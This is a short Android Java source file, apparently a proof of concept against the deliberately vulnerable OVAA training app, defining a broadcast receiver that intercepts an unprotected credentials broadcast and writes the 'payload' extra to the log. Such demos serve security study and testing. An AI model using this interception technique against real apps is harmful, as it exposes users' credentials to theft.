package com.mbl.test.bcIntercept;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.mbl.test.MainActivity;

import java.util.Objects;

public class UnSafeBCInterceptor extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i("LOG","Intercept secret data\n");
        if ("oversecured.ovaa.action.UNPROTECTED_CREDENTIALS_DATA".equals(intent.getAction())){
            Log.e("DEBUG","intent received");
            Log.d("LOG", Objects.requireNonNull(MainActivity.cc.cast(intent.getExtras().get("payload"))).toString());
        }
    }
}
